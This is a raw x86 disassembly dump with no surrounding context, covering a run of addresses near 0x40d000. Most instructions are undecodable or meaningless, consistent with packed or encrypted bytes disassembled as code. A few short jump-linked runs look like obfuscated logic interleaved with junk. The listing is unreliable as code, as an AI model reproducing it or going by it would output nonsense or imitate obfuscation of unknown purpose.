  40cfef:	fst    DWORD PTR ss:[esi-0x266ad740]
  40cff6:	inc    esi
  40cff7:	push   eax
  40cff8:	scas   eax,DWORD PTR es:[edi]
  40cff9:	je     0x40cfff
  40cffb:	outs   dx,DWORD PTR ds:[esi]
  40cffc:	je     0x40d03b
  40cffe:	int    0x1d
  40d000:	push   ds
  40d001:	loop   0x40cfa5
  40d003:	pop    esi
  40d004:	ss xor eax,0x4bc596f5
  40d00a:	jge    0x40d03f
  40d00c:	push   ebx
  40d00d:	mov    ds:0x4a2e8cff,al
  40d012:	jl     0x40d06c
  40d014:	(bad)  
  40d015:	or     DWORD PTR [esi+0x2de5d95c],ebp
  40d01b:	xchg   esi,eax
  40d01c:	xchg   ebx,eax
  40d01d:	push   ebp
  40d01e:	jnp    0x40cfc5
  40d020:	outs   dx,DWORD PTR ds:[esi]
  40d021:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d022:	fld    QWORD PTR [edi+0x2c92f7b]
  40d028:	pop    edi
  40d029:	in     eax,0x4
  40d02b:	pusha  
  40d02c:	fisttp WORD PTR [ecx+0x22]
  40d02f:	pop    eax
  40d030:	aas    
  40d031:	mov    ah,0xfc
  40d033:	xor    ebp,DWORD PTR [esi-0x6083a964]
  40d039:	mov    eax,ds:0x8ba301c6
  40d03e:	mov    ds:0xe09e2986,eax
  40d043:	in     al,0xc2
  40d045:	aad    0xa0
  40d047:	adc    DWORD PTR [esi+ebx*8+0x6b1fe06b],eax
  40d04e:	in     al,0x9a
  40d050:	xor    cl,BYTE PTR [ebp+0x5537206c]
  40d056:	pushw  ds
  40d058:	push   ds
  40d059:	mov    ebp,eax
  40d05b:	sbb    ebp,DWORD PTR [esp+ebp*8-0x20ca6195]
  40d062:	add    ebp,DWORD PTR [edi]
  40d064:	push   ecx
  40d065:	ss jge 0x40d00c
  40d068:	xor    BYTE PTR [eax-0x27],bl
  40d06b:	mov    edx,0x1b0bffbd
  40d070:	lahf   
  40d071:	mov    BYTE PTR [ebx-0xb],bh
  40d074:	mov    ch,0xa6
  40d076:	test   eax,0x2df46837
  40d07b:	scas   eax,DWORD PTR es:[edi]
  40d07c:	or     eax,0x12784a44
  40d081:	mov    ah,bl
  40d083:	frstor [esi+edi*1-0x2af5a74c]
  40d08a:	mov    ds:0x6de1670e,al
  40d08f:	xchg   BYTE PTR [edi],bh
  40d091:	push   0x65581a65
  40d096:	mov    dl,0x3c
  40d098:	and    esp,DWORD PTR [edx]
  40d09a:	daa    
  40d09b:	fwait
  40d09c:	fwait
  40d09d:	aam    0x88
  40d09f:	and    esp,esp
  40d0a1:	jbe    0x40d09e
  40d0a3:	out    dx,al
  40d0a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d0a5:	dec    BYTE PTR [ecx+0x10]
  40d0a8:	adc    eax,0x1788e4a7
  40d0ad:	adc    edx,DWORD PTR [edx-0x38]
  40d0b0:	daa    
  40d0b1:	jnp    0x40d07f
  40d0b3:	call   0x889f:0xe07cfde3
  40d0ba:	in     al,0xa3
  40d0bc:	out    dx,eax
  40d0bd:	into   
  40d0be:	cli    
  40d0bf:	(bad)  
  40d0c0:	pusha  
  40d0c1:	aas    
  40d0c2:	ins    DWORD PTR es:[edi],dx
  40d0c3:	jbe    0x40c12f
  40d0c9:	mov    edx,DWORD PTR [ebp-0xc]
  40d0cc:	mov    edi,DWORD PTR [ebp-0x24]
  40d0cf:	xor    edx,eax
  40d0d1:	add    edx,ecx
  40d0d3:	imul   edx,edi
  40d0d6:	mov    edi,DWORD PTR [ebp-0x18]
  40d0d9:	xor    edi,eax
  40d0db:	add    edx,edi
  40d0dd:	jmp    0x40d49b
  40d0e2:	xor    ah,BYTE PTR [edi+ecx*8]
  40d0e5:	out    0xcd,al
  40d0e7:	icebp  
  40d0e8:	xor    esp,esi
  40d0ea:	cmp    al,0x59
  40d0ec:	lods   al,BYTE PTR ds:[esi]
  40d0ed:	les    edi,FWORD PTR [edx]
  40d0ef:	xchg   esp,eax
  40d0f0:	punpckhdq mm5,QWORD PTR [edx-0x608f8f63]
  40d0f7:	jge    0x40d169
  40d0f9:	jo     0x40d136
  40d0fb:	adc    BYTE PTR [eax],0xc4
  40d0fe:	push   ecx
  40d0ff:	in     al,dx
  40d100:	add    al,0x5
  40d102:	test   eax,0x1fbcfa4d
  40d107:	mov    BYTE PTR [ebp-0x434bed65],bh
  40d10d:	retf   
  40d10e:	idiv   BYTE PTR [ebp+ebp*8-0x32d0bd60]
  40d115:	outs   dx,BYTE PTR ds:[esi]
  40d116:	dec    esp
  40d117:	sti    
  40d118:	(bad)
  40d11b:	push   cs
  40d11c:	or     eax,eax
  40d11e:	(bad)  
  40d11f:	adc    al,0xff
  40d121:	sbb    edx,DWORD PTR [ebp-0x1069c23f]
  40d127:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d128:	dec    ebp
  40d129:	cmp    BYTE PTR [edx],0x93
  40d12c:	test   al,0x75
  40d12e:	lea    ebx,[ecx]
  40d130:	std    
  40d131:	jbe    0x40d164
  40d133:	sbb    al,0xbe
  40d135:	dec    ebp
  40d136:	mov    edi,0x2255a4e8
  40d13b:	inc    edi
  40d13c:	ins    BYTE PTR es:[edi],dx
  40d13d:	ja     0x40d198
  40d13f:	nop
  40d140:	mov    esp,0x25e12800
  40d145:	mov    dl,0x88
  40d147:	clc    
  40d148:	mov    eax,0x6c159ecb
  40d14d:	dec    ebp
  40d14e:	dec    eax
  40d14f:	retf   
  40d150:	out    dx,eax
  40d151:	add    edi,DWORD PTR [ebx]
  40d153:	cld    
  40d154:	adc    edi,DWORD PTR [edi+ecx*4-0x5d]
  40d158:	cwde   
  40d159:	mov    fs,WORD PTR [ecx]
  40d15b:	arpl   WORD PTR gs:[ebp+0xb],bx
  40d15f:	sbb    ecx,esi
  40d161:	int    0xa2
  40d163:	adc    ebp,DWORD PTR [edx]
  40d165:	mov    edi,0xc7eff55e
  40d16a:	jb     0x40d140
  40d16c:	(bad)  
  40d16e:	push   ds
  40d16f:	jns    0x40d177
  40d171:	popf   
  40d172:	dec    eax
  40d173:	in     al,dx
  40d174:	call   DWORD PTR ds:0xf3058b76
  40d17a:	stos   BYTE PTR es:[edi],al
  40d17b:	outs   dx,BYTE PTR ds:[esi]
  40d17c:	popa   
  40d17d:	int3   
  40d17e:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d180:	stos   DWORD PTR es:[edi],eax
  40d181:	or     cl,al
  40d183:	faddp  st(4),st
  40d185:	mov    es,WORD PTR [esi+0x741ad94d]
  40d18b:	cdq    
  40d18c:	adc    ebp,DWORD PTR [eax]
  40d18e:	in     eax,dx
  40d18f:	jb     0x40d1eb
  40d191:	xchg   ecx,eax
  40d192:	mov    ds,WORD PTR ds:0x87a63339
  40d198:	adc    DWORD PTR [edi],esi
  40d19a:	adc    ebx,DWORD PTR ds:0x9320cf1
  40d1a0:	iret   
  40d1a1:	loopne 0x40d222
  40d1a3:	mov    ebx,0xd39d81cd
  40d1a8:	test   al,0xd0
  40d1aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d1ab:	push   edx
  40d1ac:	sti    
  40d1ad:	xor    DWORD PTR [ebx-0x66],esp
  40d1b0:	push   eax
  40d1b1:	test   al,0xf6
  40d1b3:	jge    0x40d1b8
  40d1b5:	lods   al,BYTE PTR ds:[esi]
  40d1b6:	adc    eax,0x502c659
  40d1bb:	addr16 sahf 
  40d1bd:	aas    
  40d1be:	outs   dx,DWORD PTR ds:[esi]
  40d1bf:	fdivr  QWORD PTR [ebp-0x79]
  40d1c2:	push   eax
  40d1c3:	das    
  40d1c4:	dec    edx
  40d1c5:	std    
  40d1c6:	mov    dh,0xea
  40d1c8:	enter  0xd343,0xbf
  40d1cc:	sbb    eax,0x9238db35
  40d1d1:	pop    ebp
  40d1d2:	cmp    esp,DWORD PTR [ebx-0x14]
  40d1d5:	loop   0x40d188
  40d1d7:	or     bl,al
  40d1d9:	and    BYTE PTR [ebp+ebp*8+0x44],bl
  40d1dd:	into   
  40d1de:	add    esp,eax
  40d1e0:	sahf   
  40d1e1:	dec    BYTE PTR [esi-0x594e5d18]
  40d1e7:	mov    bl,0x37
  40d1e9:	repz sub al,0x9c
  40d1ec:	popf   
  40d1ed:	mov    BYTE PTR [ebx+0x42],dh
  40d1f0:	sub    DWORD PTR [ebx+0x10589644],esi
  40d1f6:	adc    al,0x38
  40d1f8:	enter  0x1251,0x1c
  40d1fc:	pop    ecx
  40d1fd:	adc    edi,DWORD PTR [ecx]
  40d1ff:	mov    ch,0x23
  40d201:	and    bl,BYTE PTR [ebx+0x3bcf61ad]
  40d207:	test   BYTE PTR [edi+0x69],0x53
  40d20b:	pusha  
  40d20c:	imul   edi,DWORD PTR [ebx],0xffffff94
  40d20f:	mov    es,WORD PTR [ecx-0x76c3b702]
  40d215:	cdq    
  40d216:	and    BYTE PTR [ecx+0x3f813393],ch
  40d21c:	out    0x9a,al
  40d21e:	push   ss
  40d21f:	pop    esp
  40d220:	outs   dx,BYTE PTR ds:[esi]
  40d221:	fadd   st(2),st
  40d223:	mov    WORD PTR [ebx+0x2b],es
  40d226:	or     ecx,DWORD PTR [edi+0x57e9cb4a]
  40d22c:	xor    dl,BYTE PTR [eax+0x1a]
  40d22f:	push   ss
  40d230:	jecxz  0x40d1df
  40d232:	cmp    al,0x65
  40d234:	cmp    BYTE PTR [edx],ah
  40d236:	(bad)  
  40d238:	mov    cl,0x95
  40d23a:	neg    BYTE PTR [esi-0x3436e3f0]
  40d240:	ss out 0x41,eax
  40d243:	(bad)  
  40d245:	retf   
  40d246:	bnd jbe 0x40d2b6
  40d249:	xchg   eax,edx
  40d24b:	mov    es,WORD PTR [edx+0x7a]
  40d24e:	cmc    
  40d24f:	scas   eax,DWORD PTR es:[edi]
  40d250:	add    al,0x57
  40d252:	pop    es
  40d253:	cli    
  40d254:	and    al,0x2b
  40d256:	cs push ecx
  40d258:	push   0x7c
  40d25a:	icebp  
  40d25b:	jae    0x40d1eb
  40d25d:	add    cl,BYTE PTR [edx+eax*4+0x27470fd1]
  40d264:	mov    dl,0x50
  40d266:	and    edx,esi
  40d268:	mov    edi,edx
  40d26a:	lods   eax,DWORD PTR ds:[esi]
  40d26b:	popa   
  40d26c:	xchg   DWORD PTR [ecx+0x62],edx
  40d26f:	leave  
  40d270:	push   ss
  40d271:	xor    eax,0x8797965b
  40d276:	mov    eax,0xdd4b9b4a
  40d27b:	inc    edx
  40d27c:	mov    eax,0x3861f58
  40d281:	inc    edi
  40d282:	(bad)  
  40d283:	shr    DWORD PTR [esp+edx*4],0xe2
  40d287:	(bad)  
  40d288:	sub    al,0x3f
  40d28a:	ret    
  40d28b:	js     0x40d2d3
  40d28d:	pop    ebx
  40d28e:	jb     0x40d2e0
  40d290:	sti    
  40d291:	and    BYTE PTR ds:0x8ae6a480,bl
  40d297:	sub    DWORD PTR [esi-0x5b],ebx
  40d29a:	not    BYTE PTR [ecx+edx*8-0x4c14b9b2]
  40d2a1:	mov    esp,0x82d172eb
  40d2a6:	and    eax,0x42f8bad5
  40d2ab:	jno    0x40d2db
  40d2ad:	sub    al,0xb4
  40d2af:	(bad)  
  40d2b0:	in     eax,0xc6
  40d2b2:	call   0xb24186d1
  40d2b7:	retf   
  40d2b8:	jmp    0x30a2a556
  40d2bd:	jmp    0xcda1:0x3942b717
  40d2c4:	imul   ecx,DWORD PTR [esi+esi*4-0x2572e824],0x5f53f04d
  40d2cf:	retf   
  40d2d0:	call   0xea0012e9
  40d2d5:	mov    bl,dl
  40d2d7:	pop    ebp
  40d2d8:	pop    ebp
  40d2d9:	lock (bad) 
  40d2db:	sbb    edx,DWORD PTR [edi-0x7a]
  40d2de:	jne    0x40d26d
  40d2e0:	jmp    0x1199:0xb6ae5a66
  40d2e7:	mov    ds:0xcc9fdd3a,eax
  40d2ec:	push   esi
  40d2ed:	push   edx
  40d2ee:	or     DWORD PTR [edx+0x793a80af],edx
  40d2f4:	xchg   esi,eax
  40d2f5:	mov    eax,ds:0x31a5ad63
  40d2fa:	jge    0x40d32f
  40d2fc:	pop    esi
  40d2fd:	add    dl,BYTE PTR [esi]
  40d2ff:	or     ah,BYTE PTR [esi]
  40d301:	shl    bh,1
  40d303:	out    0x18,eax
  40d305:	adc    DWORD PTR [edi+0x10],edx
  40d308:	cmp    ch,BYTE PTR [ebx-0x2e]
  40d30b:	leave  
  40d30c:	test   eax,0xe2b17ef0
  40d311:	or     al,0x22
  40d313:	sbb    al,0x51
  40d315:	cmp    eax,0xe8043f5
  40d31a:	into   
  40d31b:	ffree  st(5)
  40d31d:	inc    edi
  40d31e:	enter  0x331e,0xdc
  40d322:	xchg   esi,ebp
  40d324:	outs   dx,DWORD PTR ds:[esi]
  40d325:	cmp    eax,0x950ca8a8
  40d32a:	popf   
  40d32b:	add    BYTE PTR [eax],0x9
  40d32e:	ret    0x47ee
  40d331:	add    bh,al
  40d333:	pop    edi
  40d334:	in     eax,0xe4
  40d336:	dec    ebp
  40d337:	je     0x40d32b
  40d339:	bound  ecx,QWORD PTR [edi]
  40d33b:	stos   DWORD PTR es:[edi],eax
  40d33c:	cwde   
  40d33d:	mov    es,ebx
  40d33f:	xor    al,0xf6
  40d341:	(bad)  
  40d342:	mov    dh,0x21
  40d344:	push   esp
  40d345:	pop    ebp
  40d346:	lahf   
  40d347:	cmp    bh,BYTE PTR [edi+0x6a]
  40d34a:	adc    eax,0x1c4b64c2
  40d34f:	sub    ebx,DWORD PTR fs:[ebp-0x78]
  40d353:	lods   eax,DWORD PTR ds:[esi]
  40d354:	call   0xb98a:0x99dc536a
  40d35b:	retf   0xdcf8
  40d35e:	add    bl,BYTE PTR [ecx+0x3ef96ada]
  40d364:	pop    esp
  40d365:	adc    DWORD PTR [edx+ebp*1],edx
  40d368:	jge    0x40d30a
  40d36a:	inc    edi
  40d36b:	sub    cl,bh
  40d36d:	adc    ch,bh
  40d36f:	imul   esi,DWORD PTR [edi],0xa6521264
  40d375:	jbe    0x40d3ae
  40d377:	outs   dx,DWORD PTR ds:[esi]
  40d378:	mov    al,ds:0xabccd074
  40d37d:	cmp    DWORD PTR [ebx-0x2],0x9c058495
  40d384:	imul   ebx,DWORD PTR [eax+0x3c],0xffffffe1
  40d388:	mov    ch,0xe3
  40d38a:	rcl    DWORD PTR [eax-0x74],1
  40d38d:	dec    edx
  40d38e:	inc    esi
  40d38f:	icebp  
  40d390:	bound  ebx,QWORD PTR ds:0xbe7291f4
  40d396:	cwde   
  40d397:	xchg   ebp,eax
  40d398:	mov    bl,0x79
  40d39a:	mov    al,0x50
  40d39c:	test   DWORD PTR [ebx+0x73],ebp
  40d39f:	rcr    DWORD PTR [eax+0x5892d8ba],1
  40d3a5:	lds    eax,FWORD PTR [esi+0x49364ba]
  40d3ab:	cwde   
  40d3ac:	call   0xaf924d0
  40d3b1:	cmp    ch,BYTE PTR [esp+esi*1]
  40d3b4:	outs   dx,BYTE PTR ds:[esi]
  40d3b5:	scas   eax,DWORD PTR es:[edi]
  40d3b6:	enter  0x59d9,0x21
  40d3ba:	push   edx
  40d3bb:	ror    BYTE PTR [edx],cl
  40d3bd:	jnp    0x40d43d
  40d3bf:	stos   DWORD PTR es:[edi],eax
  40d3c0:	dec    edi
  40d3c1:	(bad)  
  40d3c2:	xchg   esp,eax
  40d3c3:	inc    ecx
  40d3c4:	xchg   ebx,eax
  40d3c5:	add    cl,BYTE PTR [ebp+0x36]
  40d3c8:	lds    edx,FWORD PTR [esi+0x56]
  40d3cb:	mov    edi,0x982197dc
  40d3d0:	retf   0x903a
  40d3d3:	and    ebp,edx
  40d3d5:	call   0x29d92a58
  40d3da:	xor    ah,BYTE PTR [esi+0x72]
  40d3dd:	popa   
  40d3de:	outs   dx,BYTE PTR ds:[esi]
  40d3df:	test   DWORD PTR [edx-0x50],0xaeba44c1
  40d3e6:	xor    al,0xb2
  40d3e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d3e9:	(bad)  
  40d3ea:	icebp  
  40d3eb:	cld    
  40d3ec:	ins    DWORD PTR es:[edi],dx
  40d3ed:	or     edi,DWORD PTR [eax]
  40d3ef:	scas   al,BYTE PTR es:[edi]
  40d3f0:	jmp    0xb848:0x4e1eef7d
  40d3f7:	loop   0x40d3ec
  40d3f9:	xor    dh,BYTE PTR [esi+0x145e75da]
  40d3ff:	pop    eax
  40d400:	cwde   
  40d401:	je     0x40d44b
  40d403:	xor    BYTE PTR [ebp+0x64],ah
  40d406:	mov    cl,0xef
  40d408:	dec    ebx
  40d409:	rcr    BYTE PTR [ebp-0x722fb06d],0x7b
  40d410:	(bad)  
  40d411:	(bad)  
  40d412:	sub    DWORD PTR [edx-0x145f8e83],edx
  40d418:	add    al,0x72
  40d41a:	lods   al,BYTE PTR ds:[esi]
  40d41b:	sbb    esp,0x7b
  40d41e:	out    dx,al
  40d41f:	or     esp,DWORD PTR [esi+esi*1+0x12]
  40d423:	xor    eax,0xe64864ad
  40d428:	jp     0x40d434
  40d42a:	fcmovb st,st(4)
  40d42c:	lahf   
  40d42d:	jge    0x40d4a7
  40d42f:	icebp  
  40d430:	daa    
  40d431:	fdivr  DWORD PTR [edx+0x3f]
  40d434:	push   esp
  40d435:	mov    edx,0x3ea60998
  40d43a:	daa    
  40d43b:	mov    edi,0x27f2e577
  40d440:	sbb    dh,dh
  40d442:	mov    edi,esp
  40d444:	arpl   WORD PTR [edi+esi*2-0x3a],di
  40d448:	enter  0x9868,0x39
  40d44c:	hlt    
  40d44d:	test   ah,cl
  40d44f:	push   ebp
  40d450:	dec    esi
  40d451:	add    DWORD PTR [esi+eax*8+0x1151bdf9],edi
  40d458:	retf   0x4523
  40d45b:	or     ebx,edx
  40d45d:	stos   BYTE PTR es:[edi],al
  40d45e:	out    0x21,al
  40d460:	dec    esp
  40d461:	mov    DWORD PTR [edi-0x7e],esp
  40d464:	adc    BYTE PTR [ebx+0x6b],cl
  40d467:	and    edx,DWORD PTR [ecx+0x778fc61c]
  40d46d:	xor    DWORD PTR [esi-0x2b32dd0a],ebx
  40d473:	mov    DWORD PTR [ecx-0x76],esp
  40d476:	sahf   
  40d477:	cwde   
  40d478:	ds push ss
  40d47a:	repz sbb dl,cl
  40d47d:	xchg   ah,dl
  40d47f:	cmc    
  40d480:	es call 0x459c:0x834bbd61
  40d488:	mov    WORD PTR [ecx],fs
  40d48a:	lock push ecx
  40d48c:	data16 arpl di,bp
  40d48f:	inc    eax
  40d490:	inc    edi
  40d491:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d492:	mov    ah,BYTE PTR [esi]
  40d494:	mov    ebx,0x30f162f3
  40d499:	shl    DWORD PTR ds:0x8df87d8b,0x94
  40d4a0:	cmp    bl,BYTE PTR [edx+esi*2+0x55890032]
  40d4a7:	clc    
  40d4a8:	mov    edx,DWORD PTR [ebp-0x20]
  40d4ab:	xor    edx,eax
  40d4ad:	mov    edi,0xffcd8d64
  40d4b2:	sub    edi,edx
  40d4b4:	jmp    0x40d872
  40d4b9:	out    dx,al
  40d4ba:	inc    ebx
  40d4bb:	push   0x4e
  40d4bd:	jno    0x40d534
  40d4bf:	jmp    0x68d3:0xb81a1d63
  40d4c6:	lea    esi,[eax]
  40d4c8:	adc    ecx,ecx
  40d4ca:	cdq    
  40d4cb:	jo     0x40d53d
  40d4cd:	lahf   
  40d4ce:	jge    0x40d540
  40d4d0:	jo     0x40d4f7
  40d4d2:	mov    al,ds:0xd8aaa25e
  40d4d7:	mov    edx,0x53c20e11
  40d4dc:	retf   
  40d4dd:	dec    ebp
  40d4de:	mov    cl,0xa9
  40d4e0:	and    eax,0x46a3bc36
  40d4e5:	fcomp  QWORD PTR [eax+0x60ef5d8e]
  40d4eb:	inc    ebp
  40d4ec:	imul   esp,DWORD PTR [esi],0x7a
  40d4ef:	(bad)  
  40d4f0:	jnp    0x40d4ea
  40d4f2:	daa    
  40d4f3:	outs   dx,DWORD PTR ds:[esi]
  40d4f4:	js     0x40d4fe
  40d4f6:	mov    bl,0xbd
  40d4f8:	cld    
  40d4f9:	sub    ebx,DWORD PTR [ebp+edi*2-0x6d]
  40d4fd:	and    al,BYTE PTR [edi+edx*8-0x41]
  40d501:	rcr    DWORD PTR [ecx],1
  40d503:	xchg   esi,eax
  40d504:	jbe    0x40d4c2
  40d506:	inc    esi
  40d507:	pop    es
  40d508:	sbb    DWORD PTR [edi-0xc382fd8],ebp
  40d50e:	add    BYTE PTR [ecx-0x53546bb],bl
  40d514:	in     eax,dx
  40d515:	xchg   esi,eax
  40d516:	ds ins BYTE PTR es:[edi],dx
  40d518:	jno    0x40d54b
  40d51a:	dec    eax
  40d51b:	dec    esi
  40d51c:	sbb    al,0x1f
  40d51e:	dec    esp
  40d51f:	xchg   ecx,eax
  40d520:	add    bl,BYTE PTR [ecx-0x6d]
  40d523:	fbstp  TBYTE PTR [ebx+0x5693036d]
  40d529:	bound  ebp,QWORD PTR [esi+esi*8]
  40d52c:	sar    ch,cl
  40d52e:	retf   0xa27e
  40d531:	push   ebx
  40d532:	pusha  
  40d533:	pop    ebp
  40d534:	scas   eax,DWORD PTR es:[edi]
  40d535:	sub    eax,0xd1ecc485
  40d53a:	fmul   QWORD PTR [ebx+0x46ed5a3b]
  40d540:	ss lock cld 
  40d543:	test   ebp,ecx
  40d545:	cmp    eax,0xfa6b7101
  40d54a:	mov    edx,0xe8503c3f
  40d54f:	ror    BYTE PTR [esi+0x52],cl
  40d552:	dec    esp
  40d553:	cli    
  40d554:	test   BYTE PTR [ebx-0x2efd28a2],bh
  40d55a:	or     BYTE PTR [eax+esi*1],dl
  40d55d:	out    dx,al
  40d55e:	sti    
  40d55f:	push   ebp
  40d560:	in     al,dx
  40d561:	add    DWORD PTR [ebx],edx
  40d563:	aad    0x6e
  40d565:	adc    esi,DWORD PTR [edi]
  40d567:	sub    BYTE PTR [ebx+0x73c5e11c],bh
  40d56d:	(bad)  
  40d56e:	std    
  40d56f:	inc    esi
  40d570:	xor    cl,BYTE PTR [ecx+0x62ff7f92]
  40d576:	adc    ah,0x3e
  40d579:	push   0x74
  40d57b:	mov    esp,0x4809f890
  40d580:	sub    eax,0x7d198409
  40d585:	ret    
  40d586:	aam    0x2f
  40d588:	inc    edi
  40d589:	dec    ebx
  40d58a:	hlt    
  40d58b:	cmp    eax,DWORD PTR [edx]
  40d58d:	mov    edx,0xc8783a5c
  40d592:	push   edx
  40d593:	add    BYTE PTR ds:0xf495886f,0xc0
  40d59a:	lahf   
  40d59b:	ret    
  40d59c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d59d:	mov    eax,ds:0xbb2af64b
  40d5a2:	aam    0x52
  40d5a4:	mov    dh,0x23
  40d5a6:	fs jno 0x40d57d
  40d5a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d5aa:	dec    edx
  40d5ab:	(bad)  
  40d5ac:	pop    edx
  40d5ad:	bound  edx,QWORD PTR [esi]
  40d5af:	loopne 0x40d551
  40d5b1:	fimul  WORD PTR [esi+0x91b4a4b]
  40d5b7:	pop    esi
  40d5b8:	xchg   edi,eax
  40d5b9:	nop
  40d5ba:	ret    
  40d5bb:	dec    eax
  40d5bc:	gs jo  0x40d5f0
  40d5bf:	push   cs
  40d5c0:	stos   BYTE PTR es:[edi],al
  40d5c1:	enter  0x3815,0x1d
  40d5c5:	xchg   ebp,eax
  40d5c6:	or     esi,DWORD PTR [edi]
  40d5c8:	mov    ch,0x7a
  40d5ca:	fmul   st,st(3)
  40d5cc:	out    dx,eax
  40d5cd:	in     al,dx
  40d5ce:	mov    bh,0xb8
  40d5d0:	sbb    al,0x26
  40d5d2:	add    BYTE PTR [edi-0x1fe93c5],dh
  40d5d8:	mov    bh,0x53
  40d5da:	add    esi,DWORD PTR [eax+0x39]
  40d5dd:	mov    ds:0x14f893b4,al
  40d5e2:	sbb    ch,BYTE PTR [ecx]
  40d5e4:	cdq    
  40d5e5:	cmp    DWORD PTR [ecx],esi
  40d5e7:	std    
  40d5e8:	jl     0x40d603
  40d5ea:	push   edi
  40d5eb:	mov    ds:0x7c07b341,al
  40d5f0:	or     DWORD PTR [ebx+eiz*1+0x6e1e1e13],0x46
  40d5f8:	jns    0x40d5c5
  40d5fa:	add    al,0xe3
  40d5fc:	and    al,0x29
  40d5fe:	in     eax,0x43
  40d600:	enter  0x30d6,0x5c
  40d604:	and    eax,0xf314ca15
  40d609:	and    eax,0x6da31e87
  40d60e:	xchg   cl,dl
  40d610:	push   ebx
  40d611:	or     al,0x3
  40d613:	(bad)  
  40d614:	xor    BYTE PTR [ecx],bh
  40d616:	shl    ah,1
  40d618:	int    0x2a
  40d61a:	xchg   edx,eax
  40d61b:	stos   DWORD PTR es:[edi],eax
  40d61c:	(bad)  
  40d61d:	or     edi,esi
  40d61f:	ins    DWORD PTR es:[edi],dx
  40d620:	jbe    0x40d5e9
  40d622:	shl    DWORD PTR [edx],1
  40d624:	or     BYTE PTR [edx-0x20],dh
  40d627:	jg     0x40d669
  40d629:	mov    eax,0xa6868137
  40d62e:	cmp    esp,DWORD PTR [edx+eiz*2]
  40d631:	lods   eax,DWORD PTR ds:[esi]
  40d632:	mov    al,BYTE PTR [ecx+0xb4b0a94]
  40d638:	and    eax,0x8ec80b8c
  40d63d:	xchg   edx,esi
  40d63f:	mov    ebx,DWORD PTR [ebp-0x62]
  40d642:	outs   dx,BYTE PTR ds:[esi]
  40d643:	test   DWORD PTR [esi],eax
  40d645:	push   es
  40d646:	inc    esi
  40d647:	inc    eax
  40d648:	push   eax
  40d649:	mov    BYTE PTR [esi-0x2b8c1eab],dh
  40d64f:	and    BYTE PTR [edx],ah
  40d651:	out    dx,eax
  40d652:	mov    bh,0x48
  40d654:	repz pop ss
  40d656:	xor    al,0xd
  40d658:	cld    
  40d659:	mov    ds:0xa1850589,eax
  40d65e:	cmp    esi,DWORD PTR [ecx-0x3c8a4b8e]
  40d664:	gs out dx,eax
  40d666:	sbb    BYTE PTR [edi],cl
  40d668:	or     eax,0x3a67741a
  40d66d:	jne    0x40d6b6
  40d66f:	popa   
  40d670:	jmp    0x40d66d
  40d672:	imul   esi
  40d674:	int3   
  40d675:	int3   
  40d676:	ss pusha 
  40d678:	nop
  40d679:	sahf   
  40d67a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d67b:	push   ss
  40d67c:	retf   
  40d67d:	mov    cl,0x7f
  40d67f:	add    eax,0xee2f8298
  40d684:	cs ins BYTE PTR es:[edi],dx
  40d686:	dec    eax
  40d687:	ret    
  40d688:	mov    ah,0x44
  40d68a:	das    
  40d68b:	shl    ebx,cl
  40d68d:	call   0x2f18:0xf0097a6
  40d694:	sbb    al,0x50
  40d696:	xlat   BYTE PTR ds:[ebx]
  40d697:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d698:	inc    ebx
  40d699:	inc    ecx
  40d69a:	adc    edx,DWORD PTR [eax+0x1b]
  40d69d:	pushf  
  40d69e:	push   es
  40d69f:	fdivrp st(6),st
  40d6a1:	mov    al,0x95
  40d6a3:	js     0x40d6a0
  40d6a5:	and    al,0xcd
  40d6a7:	cwde   
  40d6a8:	mov    DWORD PTR [ebx+0x7aa33135],ebx
  40d6ae:	add    esp,DWORD PTR [eax+esi*8]
  40d6b1:	xchg   edi,eax
  40d6b2:	mov    ?,eax
  40d6b4:	fiadd  DWORD PTR [esi]
  40d6b6:	nop
  40d6b7:	add    al,BYTE PTR [ecx]
  40d6b9:	add    eax,0xd3ef898d
  40d6be:	fchs   
  40d6c0:	ss xchg esi,eax
  40d6c2:	jbe    0x40d689
  40d6c4:	mov    ebp,0xf4817154
  40d6c9:	out    0xad,eax
  40d6cb:	ret    
  40d6cc:	mov    esp,0xec2a7f45
  40d6d1:	ret    
  40d6d2:	dec    edx
  40d6d3:	jae    0x40d6fe
  40d6d5:	dec    ebx
  40d6d6:	sub    DWORD PTR [ecx],ebp
  40d6d8:	shl    DWORD PTR [ecx-0x46],cl
  40d6db:	add    eax,0xb0d8fe6
  40d6e0:	cmc    
  40d6e1:	adc    ecx,esi
  40d6e3:	push   ebp
  40d6e4:	out    dx,eax
  40d6e5:	dec    esp
  40d6e6:	jg     0x40d70d
  40d6e8:	(bad)  
  40d6e9:	fdivr  st,st(0)
  40d6eb:	and    DWORD PTR [esp+edi*4+0x17],ebx
  40d6ef:	cmp    eax,0x490ff975
  40d6f4:	adc    ch,0xf9
  40d6f7:	lahf   
  40d6f8:	mov    eax,0xb8149f68
  40d6fd:	mov    ch,BYTE PTR [ebx]
  40d6ff:	stc    
  40d700:	fdiv   QWORD PTR [edx-0x22]
  40d703:	mov    ds,WORD PTR [edi+0x1f7f65a5]
  40d709:	cmp    al,al
  40d70b:	sbb    bl,BYTE PTR [ebx+0x4cde0161]
  40d711:	retf   0x905f
  40d714:	lock jae 0x40d753
  40d717:	pop    es
  40d718:	lahf   
  40d719:	fcomip st,st(0)
  40d71b:	mov    edi,0x4236bc
  40d720:	pop    ebp
  40d721:	and    al,0x9d
  40d723:	sbb    esi,ecx
  40d725:	fnstcw WORD PTR [ecx-0x8]
  40d728:	mov    bh,BYTE PTR [eax-0x4f3a8c22]
  40d72e:	lea    edi,[edi-0x55196886]
  40d734:	popa   
  40d735:	dec    ebx
  40d736:	call   0x1c1cee75
  40d73b:	cmp    eax,0xaaef4499
  40d740:	jbe    0x40d74e
  40d742:	int    0x17
  40d744:	cvtdq2ps xmm3,XMMWORD PTR [ebp+ebp*2-0x24219a0d]
  40d74c:	xchg   esp,eax
  40d74d:	scas   al,BYTE PTR es:[edi]
  40d74e:	push   esp
